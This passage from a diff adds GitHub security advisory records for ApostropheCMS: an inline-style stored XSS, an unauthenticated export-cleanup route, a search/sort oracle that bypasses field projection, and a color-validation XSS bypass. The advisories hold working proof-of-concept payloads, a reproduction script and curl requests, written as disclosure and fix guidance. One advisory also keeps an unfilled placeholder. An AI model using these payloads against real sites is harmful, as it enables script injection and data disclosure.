context:\n\n[`packages/apostrophe/modules/@apostrophecms/schema/lib/addFieldTypes.js:296-333`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/schema/lib/addFieldTypes.js#L296-L333)\n\n```javascript\nself.addFieldType({\n  name: 'string',\n  // ...\n  convert(req, field, data, destination) {\n    destination[field.name] = self.apos.launder.string(data[field.name]);\n    destination[field.name] = checkStringLength(\n      destination[field.name],\n      field.min,\n      field.max\n    );\n  }\n});\n```\n\nQuotes therefore remain in a value supplied through a style field.\n\n### Root Cause 2: The value is converted into inline CSS without value validation\n\nFor a field with `property` but no `selector` or media query, `renderScopedStyles()` selects inline rendering. The generic extractor concatenates the configured property and editor-controlled value:\n\n[`packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs:171-228`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/styles/ui/apos/universal/render.mjs#L171-L228)\n\n[`packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs:598-647`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/styles/ui/apos/universal/render.mjs#L598-L647)\n\n```javascript\nrule = `${property}: ${normalized.value}${normalized.unit}`;\n\n// ...\n\nif (isInline) {\n  return {\n    css: '',\n    classes: [ ...storage.classes ],\n    inline: stringifyRules(storage.styles, true)\n  };\n}\n```\n\nFor example, the value below becomes part of a `font-family` declaration:\n\n```text\nserif\" tabindex=\"0\" autofocus onfocus=\"document.body.dataset.inline='executed'\n```\n\n### Root Cause 3: Attribute values are serialized without HTML escaping\n\n`getWidgetAttributes()` places the inline CSS into an attribute tuple, then concatenates every tuple into `key=\"value\"` without encoding `&`, `<`, `>`, `'`, or `\"`:\n\n[`packages/apostrophe/modules/@apostrophecms/styles/lib/methods.js:251-322`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/styles/lib/methods.js#L251-L322)\n\n```javascript\nif (styleParts.length) {\n  attrs.push(\n    [ 'style', `${styleParts.join(';')};` ]\n  );\n}\n\nif (options.asObject) {\n  return Object.fromEntries(attrs);\n}\n\nreturn attrs\n  .map(([ key, value ]) => `${key}=\"${value}\"`)\n  .join(' ');\n```\n\nThe same raw serializer also makes a project-defined free-form `string` style with `class: true` a potential sibling path, because the string is added to `classes` and later serialized into `class=\"...\"`. The inline-property path was the path dynamically verified.\n\n### Root Cause 4: The unsafe string is used by the automatic public wrapper\n\nStyled widgets use `getWidgetAttributes()` to create a wrapper around the rendered widget:\n\n[`packages/apostrophe/modules/@apostrophecms/widget-type/index.js:448-457`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/widget-type/index.js#L448-L457)\n\n```javascript\nif (hasStyles && self.options.stylesWrapper !== false) {\n  const styles = self.apos.styles.prepareWidgetStyles(widget);\n  const styleTag = self.apos.styles\n    .getWidgetElements(styles, { scene: req.scene });\n  const wrapperAttrs = self.apos.styles.getWidgetAttributes(styles);\n\n  return `${styleTag}<div${wrapperAttrs ? ' ' + wrapperAttrs : ''}>${markup}</div>`;\n}\n```\n\nConsequently, the injected attribute is present on normal public page renders, not only in the editor UI.\n\n### Why the CVE-2026-33889 defense does not prevent this variant\n\nThe sibling advisory led to a defense in `getWidgetElements()` that rewrites `</` before CSS is inserted into a `<style>` element:\n\n```javascript\ncss = css.replaceAll('</', '<\\\\/');\n```\n\nThis protects the style-element boundary. The vulnerable path above produces `inline` output instead of `css`, so it never reaches that replacement.\n\n## Affected Configurations and Versions\n\nThe verified configuration has all of the following properties:\n\n- A widget defines a style field with a free-form type such as `string`.\n- The field uses `property` without a selector, causing inline-style rendering, or uses `class: true` with an unrestricted string value.\n- The attacker has permission to edit a widget containing the field.\n- The malicious content is published, or a higher-privileged user views the affected draft.\n\nStandard range, select, and color presets do not directly provide an unrestricted quote-containing value and were not demonstrated as affected by this variant.\n\n## Proof of Concept\n\n### Step 1: Configure a widget with a free-form inline style\n\nAdd a style field similar to the following to a widget module:\n\n```javascript\nmodule.exports = {\n  extend: '@apostrophecms/widget-type',\n  options: {\n    label: 'Style Attribute Test'\n  },\n  styles: {\n    add: {\n      customFont: {\n        type: 'string',\n        label: 'Custom Font',\n        property: 'font-family'\n      }\n    }\n  }\n};\n```\n\nThe absence of `selector` makes the generated declaration inline.\n\n### Step 2: Store the payload\n\nAs a user who may edit this widget, enter the following value in `customFont` and save the widget:\n\n```text\nserif\" tabindex=\"0\" autofocus onfocus=\"document.body.dataset.inline='executed'\n```\n\nPublish the page, or have another user view the affected draft.\n\n### Step 3: Reproduce the renderer output directly\n\nThe vulnerable data flow can also be reproduced using the real renderer and serializer from a checked-out, dependency-installed repository:\n\n```javascript\nconst methodsFactory = require(\n  './packages/apostrophe/modules/@apostrophecms/styles/lib/methods.js'\n);\n\n(async () => {\n  const { renderScopedStyles } = await import(\n    './packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs'\n  );\n\n  const payload =\n    'serif\" tabindex=\"0\" autofocus ' +\n    'onfocus=\"document.body.dataset.inline=\\'executed\\'';\n\n  const styles = renderScopedStyles(\n    [ {\n      name: 'customFont',\n      type: 'string',\n      property: 'font-family'\n    } ],\n    { customFont: payload }\n  );\n\n  Object.assign(styles, {\n    styleId: 'audit-inline',\n    widgetId: 'widget-1'\n  });\n\n  const attrs = methodsFactory({}, {}).getWidgetAttributes(styles);\n  console.log('inline:', styles.inline);\n  console.log('attributes:', attrs);\n})();\n```\n\n### Step 4: Observe the unsafe HTML\n\nThe current renderer produced:\n\n```text\ninline: font-family: serif\" tabindex=\"0\" autofocus onfocus=\"document.body.dataset.inline='executed';\n```\n\nThe serializer then produced an attribute string equivalent to:\n\n```html\nid=\"audit-inline\"\ndata-apos-widget-style-wrapper-for=\"widget-1\"\ndata-apos-widget-style-classes=\"\"\nstyle=\"font-family: serif\" tabindex=\"0\" autofocus\nonfocus=\"document.body.dataset.inline='executed';\"\n```\n\nThe attacker-controlled quote terminates the `style` attribute. `tabindex`, `autofocus`, and `onfocus` become separate live attributes.\n\n### Step 5: Confirm execution in a browser\n\nWhen the generated wrapper was loaded in Chrome 153, autofocus triggered the injected handler automatically. The DOM changed to:\n\n```html\n<body data-inline=\"executed\">\n  <div id=\"audit-inline\" tabindex=\"0\" autofocus=\"\" onfocus=\"...\"></div>\n</body>\n```\n\nThe safe behavior would be for the quote to appear as `&quot;` inside the `style` attribute, with no injected attributes and no change to `document.body.dataset`.\n\n## Impact\n\n- **Stored XSS on published pages:** JavaScript executes for unauthenticated visitors who load a page containing the affected widget.\n- **Privilege escalation:** If an administrator or another privileged editor views the page or draft, the payload executes with that user's application-origin privileges and can perform authenticated actions available to the victim.\n- **Persistent content manipulation:** The payload is stored with widget content and continues to execute until the style value is removed or the output path is fixed.\n- **Phishing and data access:** The script can alter the rendered page, read non-HttpOnly same-origin data, and issue same-origin requests as the victim.\n\n## Recommended Fix\n\n### Fix 1: HTML-escape every string-returning attribute value\n\nThe string branch of `getWidgetAttributes()` should encode values for a double-quoted HTML attribute context before concatenation. At minimum, encode `&`, `<`, `>`, `\"`, and `'` using a centralized Apostrophe HTML encoder.\n\nConceptually:\n\n```javascript\nif (options.asObject) {\n  return Object.fromEntries(attrs);\n}\n\nreturn attrs\n  .map(([ key, value ]) => {\n    return `${key}=\"${escapeHtmlAttribute(String(value))}\"`;\n  })\n  .join(' ');\n```\n\nThe structured `asObject` branch should remain structured so that its eventual template/DOM renderer can perform context-appropriate encoding.\n\n### Fix 2: Validate style values by their destination grammar\n\nOutput encoding is the primary fix. As defense in depth:\n\n- Require select/range/color or another constrained type for common CSS properties.\n- Parse and validate free-form CSS property values instead of treating them as arbitrary strings.\n- For `class: true`, accept only individual valid class-name tokens rather than an unrestricted string.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-7jg5-frgc-c67w",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-7jg5-frgc-c67w",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112958",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-7jg5-frgc-c67w",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112958",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0",
+      "https://github.com/advisories/GHSA-7jg5-frgc-c67w"
+    ],
+    "published_at": "2026-10-21T17:15:07Z",
+    "updated_at": "2026-10-21T17:15:08Z",
+    "github_reviewed_at": "2026-10-21T17:15:07Z",
+    "nvd_published_at": "2026-10-20T17:17:33Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.34.0",
+        "first_patched_version": "4.34.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+        "score": 5.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "farisv",
+          "id": 44131180,
+          "node_id": "MDQ6VXNlcjQ0MTMxMTgw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/44131180?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/farisv",
+          "html_url": "https://github.com/farisv",
+          "followers_url": "https://api.github.com/users/farisv/followers",
+          "following_url": "https://api.github.com/users/farisv/following{/other_user}",
+          "gists_url": "https://api.github.com/users/farisv/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/farisv/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/farisv/subscriptions",
+          "organizations_url": "https://api.github.com/users/farisv/orgs",
+          "repos_url": "https://api.github.com/users/farisv/repos",
+          "events_url": "https://api.github.com/users/farisv/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/farisv/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+      "score": 5.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rw26-wwfc-9wvm",
+    "cve_id": "CVE-2026-113648",
+    "url": "https://api.github.com/advisories/GHSA-rw26-wwfc-9wvm",
+    "html_url": "https://github.com/advisories/GHSA-rw26-wwfc-9wvm",
+    "summary": "ApostropheCMS: Missing Authentication in `cleanExport` Route",
+    "description": "#### 1. Summary\nThe API endpoint `POST /api/v1/@apostrophecms/import-export/clean-export` in `@apostrophecms/import-export` lacks authentication and authorization checks. Any client—including unauthenticated anonymous users who have obtained the standard CSRF cookie from visiting the site—can directly invoke this route and trigger the underlying `self.cleanExport(req)` method.\n\n---\n\n#### 2. Affected Files & Endpoints\n* **Endpoint:** `POST /api/v1/@apostrophecms/import-export/clean-export`\n* **Route Definition:** `packages/import-export/lib/apiRoutes.js` (lines 32–34)\n* **Method Implementation:** `packages/import-export/lib/methods/import.js` (lines 1271–1324)\n\n---\n\n#### 3. Root Cause Analysis\nIn `packages/import-export/lib/apiRoutes.js`, the `get.related` handler explicitly validates that the caller is logged in:\n```javascript\nget: {\n  async related(req) {\n    if (!req.user) {\n      throw self.apos.error('forbidden');\n    }\n    // ...\n  }\n}\n```\nIn contrast, `post.cleanExport` (as well as `post.overrideDuplicates`) lacks any verification of `req.user`:\n```javascript\npost: {\n  async overrideDuplicates(req) {\n    return self.overrideDuplicates(req);\n  },\n\n  async cleanExport(req) {\n    return self.cleanExport(req); // <-- No authentication check\n  }\n}\n```\nBecause ApostropheCMS does not enforce authentication globally on all `apiRoutes`, omitting an explicit `if (!req.user)` guard allows anonymous requests to pass directly through to the business logic layer.\n\n---\n\n#### 4. Evidence\nWhen sending an unauthenticated POST request with the site’s CSRF cookie (issued to any visitor on `GET /`), the request bypasses access control entirely and executes `self.cleanExport(req)`, as demonstrated by the server stack trace:\n\n```text\nat Object.cleanExport (.../packages/import-export/lib/methods/import.js)\nat .../packages/apostrophe/modules/@apostrophecms/module/index.js:193:30\n```\nThis confirms that execution directly reaches the core import-export handler without an authenticated session.\n\n---\n\n#### 5. Impact\n1. **Broken Access Control:** Unauthenticated users can invoke cleanup operations and delete temporary export files and artifacts stored on the server.\n2. **Unauthorized State Mutation:** The endpoint allows modifying job records in the database via `req.body.jobId` (forcing them to `ended: true, status: 'completed'`) and dismissing notifications via `req.body.notificationId` without verifying whether the resources belong to the requesting caller.\n\n---\n\n#### 6. Suggested Remediation (Patch)\n\nEnforce an authentication check in `packages/import-export/lib/apiRoutes.js` before executing the underlying methods:\n\n```diff\n--- a/packages/import-export/lib/apiRoutes.js\n+++ b/packages/import-export/lib/apiRoutes.js\n@@ -26,10 +26,16 @@ module.exports = self => {\n     get: { ... },\n     post: {\n       async overrideDuplicates(req) {\n+        if (!req.user) {\n+          throw self.apos.error('forbidden');\n+        }\n         return self.overrideDuplicates(req);\n       },\n \n       async cleanExport(req) {\n+        if (!req.user) {\n+          throw self.apos.error('forbidden');\n+        }\n         return self.cleanExport(req);\n       }\n     }\n```",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-rw26-wwfc-9wvm",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-rw26-wwfc-9wvm",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-113648",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rw26-wwfc-9wvm",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-113648",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.1",
+      "https://github.com/advisories/GHSA-rw26-wwfc-9wvm"
+    ],
+    "published_at": "2026-10-21T17:13:28Z",
+    "updated_at": "2026-10-21T17:13:28Z",
+    "github_reviewed_at": "2026-10-21T17:13:28Z",
+    "nvd_published_at": "2026-10-20T17:17:35Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@apostrophecms/import-export"
+        },
+        "vulnerable_version_range": "< 3.7.1",
+        "first_patched_version": "3.7.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "score": 3.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-306",
+        "name": "Missing Authentication for Critical Function"
+      },
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "CoSunshine",
+          "id": 20333522,
+          "node_id": "MDQ6VXNlcjIwMzMzNTIy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/20333522?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/CoSunshine",
+          "html_url": "https://github.com/CoSunshine",
+          "followers_url": "https://api.github.com/users/CoSunshine/followers",
+          "following_url": "https://api.github.com/users/CoSunshine/following{/other_user}",
+          "gists_url": "https://api.github.com/users/CoSunshine/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/CoSunshine/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/CoSunshine/subscriptions",
+          "organizations_url": "https://api.github.com/users/CoSunshine/orgs",
+          "repos_url": "https://api.github.com/users/CoSunshine/repos",
+          "events_url": "https://api.github.com/users/CoSunshine/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/CoSunshine/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+      "score": 3.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rqgm-cfrp-4hx8",
+    "cve_id": "CVE-2026-112954",
+    "url": "https://api.github.com/advisories/GHSA-rqgm-cfrp-4hx8",
+    "html_url": "https://github.com/advisories/GHSA-rqgm-cfrp-4hx8",
+    "summary": "ApostropheCMS: Unauthenticated publicApiProjection bypass via search and sort query builders in the public REST API",
+    "description": "### Summary\nApostropheCMS lets a module expose an anonymous read API by setting `publicApiProjection`, which whitelists the document fields unauthenticated callers may see. The public REST GET handler applies every launderable query builder from the query string *before* forcing that projection. Two of those builders, `search` and `sort`, operate on the underlying documents rather than the projected output, and neither is checked against the projection. An unauthenticated attacker can therefore:\n\n- use `?search=<word>` as a **value oracle** to confirm and locate documents by the content of a field the projection was meant to hide, and\n- use `?sort[hiddenField]=1` as an **ordering oracle** to rank documents by a hidden field's value.\n\nThis is the same confidentiality-bypass class already patched for the `choices`/`counts` builders (gated by `choicesFieldAllowedByProjection`). That gate was never applied to `search` or `sort`.\n\n### Details\nFor an anonymous caller, `getRestQuery` (piece types: `modules/@apostrophecms/piece-type/index.js:1142`; pages: `modules/@apostrophecms/page/index.js`) does:\n\n```js\nconst query = self.find(req).attachments(true);\nquery.applyBuildersSafely(req.query);            // (1) apply ALL launderable builders from the query string\n...\nquery.project({ ...self.options.publicApiProjection, cacheInvalidatedAt: 1 }); // (2) force read projection\nquery.set('publicApiProjection', self.options.publicApiProjection);            // (3) used only by the choices/counts gate\n```\n\n`applyBuildersSafely` (`modules/@apostrophecms/doc-type/index.js:3327`) runs any builder that has a `launder` method. `search` and `sort` both have one (`doc-type/index.js:2288` and `2127`), so `?search=` and `?sort[...]=` are honored for anonymous requests.\n\n**Search vector.** The `search` builder adds `{ $text: { $search: <user input> } }` (`doc-type/index.js:2282`). The `$text` index covers `highSearchText` / `lowSearchText` / `title` / `searchBoost` (`modules/@apostrophecms/doc/index.js:612`). `highSearchText` / `lowSearchText` are built at save time by `@apostrophecms/search:getSearchTexts` → `apos.schema.indexFields(schema, doc, texts)` (`modules/@apostrophecms/search/index.js:377`), which indexes every schema field where `searchable !== false` (the default for string/text fields). `publicApiProjection` does not imply `searchable: false`. Step (2) narrows the output but not the `$text` filter, so the response returns the projected `{title, slug, _id}` of exactly the documents whose hidden field contains the searched word.\n\n**Sort vector.** `finalizeSort` (`doc-type/index.js:3526`) forwards raw user sort keys to MongoDB (it only rewrites fields flagged `sortify: true`). `?sort[hiddenField]=1` orders results by a projection-excluded field. Combined with `perPage`/`page`, an attacker can page through the fully ordered set.\n\nNeither builder consults `publicApiProjection`, whereas `choices`/`counts` are gated at `doc-type/index.js:2807` via `choicesFieldAllowedByProjection`.\n\n### PoC\n**Preconditions:** the piece/page type sets `publicApiProjection`, and its schema has at least one searchable (default) or sortable field not included in the projection.\n\nTest type: `article` exposes only `title`, `slug`, `_id`, but has hidden `secret` (integer) and `secretNote` (searchable string):\n\n```js\nexport default {\n  extend: '@apostrophecms/piece-type',\n  options: { publicApiProjection: { title: 1, slug: 1, _id: 1 } },\n  fields: { add: {\n    secret:     { type: 'integer' },\n    secretNote: { type: 'string' }   // searchable by default; NOT in the projection\n  } }\n};\n```\n\nFive articles were inserted and published via the authenticated REST API:\n`A.secret=50, secretNote=\"zzsecretalpha\"`; `B=10/zzsecretbravo`; `C=90/zzsecretcharlie`; `D=30/zzsecretdelta`; `E=70/zzsecretecho`.\nThe insert responses confirm the hidden `secretNote` value is written into the search index, e.g. for A: `\"highSearchText\": \"... zzsecretalpha\"`, `\"lowSearchText\": \"... zzsecretalpha\"`.\n\nAnonymous requests (no credentials, no session):\n\n```bash\n# [1] Baseline: projection hides secret/secretNote on direct read\ncurl -s 'http://localhost:3000/api/v1/article?perPage=1'\n\n# [2] Search oracle: value exists ONLY in hidden secretNote\ncurl -s 'http://localhost:3000/api/v1/article?search=zzsecretalpha'\ncurl -s 'http://localhost:3000/api/v1/article?search=zznotpresentxyz'\n\n# [3] Sort oracle: order by hidden integer field\ncurl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=1'\ncurl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=-1'\n\n# Negative control: projection override is blocked\ncurl -s 'http://localhost:3000/api/v1/article?project%5BsecretNote%5D=1&perPage=1'\n```\n\nResults (verified on ApostropheCMS 4.32.2, MongoDB 7.0):\n\n| Request (anonymous)       | Observed                                          | Verdict                               |\n| ------------------------- | ------------------------------------------------- | ------------------------------------- |\n| `GET /api/v1/article`     | `_id,title,slug,type,metaType,cacheInvalidatedAt` | projection works on direct read       |\n| `?search=zzsecretalpha`   | only Article A (with textScore)                   | **leak**: locates doc by hidden field |\n| `?search=zznotpresentxyz` | 0 results                                         | oracle confirmed                      |\n| `?sort[secret]=1`         | B, D, A, E, C  (= 10,30,50,70,90)                 | **leak**: full hidden ordering        |\n| `?sort[secret]=-1`        | C, E, A, D, B                                     | reverse confirmed                     |\n| `?project[secretNote]=1`  | secretNote absent                                 | gated (projection override blocked)   |\n\n### Impact\nUnauthenticated, network-reachable partial disclosure of fields the developer explicitly restricted with `publicApiProjection`:\n\n- **Search oracle:** confirm and locate documents by words in hidden fields (e.g. internal notes, contact emails, draft metadata, moderation/status flags), returning the `title`/`slug`/`_id` of matches.\n- **Sort oracle:** full ordering of documents by a hidden field. With one known reference value or a paging binary search, exact hidden values can be recovered.\n\nNo authentication or user interaction required. Not a full field dump, but a targeted oracle over exactly the data the projection is meant to conceal. Affects sites that configure `publicApiProjection` on piece types or pages, up to and including 4.32.2 (same code path present on current `main`).\n\n### Remediation\nGate `search`, `sort` (and `autocomplete`, which feeds `search`) on the public API path the same way `choices`/`counts` are gated. When `publicApiProjection` is in force:\n\n- **sort:** reject or drop any sort key not permitted by the projection, reusing `choicesFieldAllowedByProjection`.\n- **search:** restrict full-text search to fields the projection exposes (e.g. a projection-scoped search text), or refuse the `search` builder when the projection excludes any searchable field.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-rqgm-cfrp-4hx8",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-rqgm-cfrp-4hx8",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112954",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rqgm-cfrp-4hx8",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112954",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0",
+      "https://github.com/advisories/GHSA-rqgm-cfrp-4hx8"
+    ],
+    "published_at": "2026-10-21T17:12:15Z",
+    "updated_at": "2026-10-21T17:12:17Z",
+    "github_reviewed_at": "2026-10-21T17:12:15Z",
+    "nvd_published_at": "2026-10-20T16:17:06Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.34.0",
+        "first_patched_version": "4.34.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "saiharsha0546-dot",
+          "id": 228060603,
+          "node_id": "U_kgDODZftuw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/228060603?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/saiharsha0546-dot",
+          "html_url": "https://github.com/saiharsha0546-dot",
+          "followers_url": "https://api.github.com/users/saiharsha0546-dot/followers",
+          "following_url": "https://api.github.com/users/saiharsha0546-dot/following{/other_user}",
+          "gists_url": "https://api.github.com/users/saiharsha0546-dot/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/saiharsha0546-dot/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/saiharsha0546-dot/subscriptions",
+          "organizations_url": "https://api.github.com/users/saiharsha0546-dot/orgs",
+          "repos_url": "https://api.github.com/users/saiharsha0546-dot/repos",
+          "events_url": "https://api.github.com/users/saiharsha0546-dot/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/saiharsha0546-dot/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vmgj-9cwm-cf3h",
+    "cve_id": "CVE-2026-112951",
+    "url": "https://api.github.com/advisories/GHSA-vmgj-9cwm-cf3h",
+    "html_url": "https://github.com/advisories/GHSA-vmgj-9cwm-cf3h",
+    "summary": "ApostropheCMS: Color field validation bypass allows stored XSS via HTML appended after rgb()/hsl() prefix",
+    "description": "### Summary\nThe color field accepts any string that *begins* with a valid `rgb()` / `hsl()` color, because `TinyColor.isValid` does not anchor its match at the end of the string. An authenticated user with edit rights can store arbitrary HTML after a valid color prefix. When the stored value is rendered , the payload executes, resulting in stored XSS.\n\n### Details\nServer-side validation of the color field relies on TinyColor:\n\n```js\nconst { TinyColor } = require('@ctrl/tinycolor');\nif (!new TinyColor(value).isValid) throw self.apos.error('invalid');\n```\n\nTinyColor's `rgb`/`hsl` matchers are not anchored at the end of the string, while hex matchers are. Tested with @ctrl/tinycolor\n\n| Input | `isValid` |\n|---|---|\n| `rgb(1,2,3)<img src=x onerror=alert(1)>` | `true` |\n| `rgb(1,2,3)</textarea><script>alert(1)</script>` | `true` |\n| `hsl(0,100%,50%);--x:1}</style><script>alert(1)</script>` | `true` |\n| `#ff0000<img src=x onerror=alert(1)>` | `false` |\n\nThe value is saved to MongoDB unchanged (not normalized to hex8).\n\n### Relation to GHSA-97v6-998m-fp4g\nGHSA-97v6 addressed CSS custom property injection escaping a `<style>` context. The root cause (validation that accepts trailing content after a valid color) still exists in <= 4.32.2, so [FILL IN: either \"the style-tag sink remains exploitable via `</style>`\" OR \"a separate HTML sink at X is exploitable\"]. Fixing the validation (requiring the full string to be a color, or storing only TinyColor's normalized output) would close both.\n\n### Impact\nAny user with edit permission can plant persistent JavaScript that runs in the browser of visitors and administrators viewing the affected page, enabling session hijacking and actions as an admin.\n\n### Suggested fix\nReject values unless the entire string is a valid color, e.g. normalize on save:\n```js\nconst c = new TinyColor(value);\nif (!c.isValid) throw self.apos.error('invalid');\nvalue = c.toHex8String(); // store only normalized output\n```",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-vmgj-9cwm-cf3h",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-vmgj-9cwm-cf3h",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112951",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vmgj-9cwm-cf3h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112951",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0",
+      "https://github.com/advisories/GHSA-vmgj-9cwm-cf3h"
+    ],
+    "published_at": "2026-10-21T17:05:44Z",
+    "updated_at": "2026-10-21T17:05:44Z",
+    "github_reviewed_at": "2026-10-21T17:05:44Z",
+    "nvd_published_at": "2026-10-20T16:17:05Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
